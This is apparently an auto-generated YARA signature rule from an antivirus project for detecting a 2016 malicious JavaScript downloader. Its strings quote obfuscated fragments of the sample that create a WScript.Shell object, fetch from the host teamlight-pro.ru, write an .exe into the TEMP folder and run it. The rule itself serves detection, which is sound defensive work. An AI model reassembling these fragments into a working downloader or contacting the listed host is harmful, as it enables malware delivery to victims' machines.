rule sig_20160401_761b68e881457c33acc8b92eb578da95 {
  meta:
    description = "datamaliciousorder - file 20160401_761b68e881457c33acc8b92eb578da95.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "c13069bcfac74309aa9cc7d248a4ae29bb5fa5448210295bd750867edaf290b9"

  strings:
    $s1  = "function AvUhb(PmPc, PmsWzd){EozYp = EozYp * 1; return PmPc - PmsWzd;};" fullword ascii
    $s2  = "var QvjXs = function VdXw() {return WScript[IvoYe](\"WScript\"+\".Shell\");}(), AupZy = 11;" fullword ascii
    $s3  = "TkPhn[LleRl](\"G\" + \"ET\", \"http://teamlight-pro.ru/j7esp\", false);" fullword ascii
    $s4  = "if (TkPhn[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function VmkBxi() {return QvjXs[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"Z8grBW4G.ex\" + \"e\";};" fullword ascii
    $s6  = "function PaYn(){return NrBbj + \"\";};" fullword ascii
    $s7  = "function KkKup() {return ((RrxKl == true) && (RrxKl == XrIo)) ? 1 : EozYp;};" fullword ascii
    $s8  = "function RjSam(CocWka) {var AkGfk = (1, 2, 3, 4, 5, CocWka); return AkGfk;};" fullword ascii
    $s9  = "var UbEj = false;" fullword ascii
    $s10 = "function UaOjk()" fullword ascii
    $s11 = "XrIo = true; " fullword ascii
    $s12 = "var XxnNxi = new this[\"Date\"]();" fullword ascii
    $s13 = "var RrxKl = false;" fullword ascii
    $s14 = "RrxKl = true; " fullword ascii
    $s15 = "return AvUhb(JjCn, EbcXp);" fullword ascii
    $s16 = "function MynNp(){return 23;};" fullword ascii
    $s17 = "function ZvYl(JrkXqq){QvjXs[\"R\"+\"un\"](JrkXqq, EozYp, EozYp);};" fullword ascii
    $s18 = "function OfXf(){return IvoYe;};" fullword ascii
    $s19 = "var XrIo = false;" fullword ascii
    $s20 = "} catch(QtUde){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}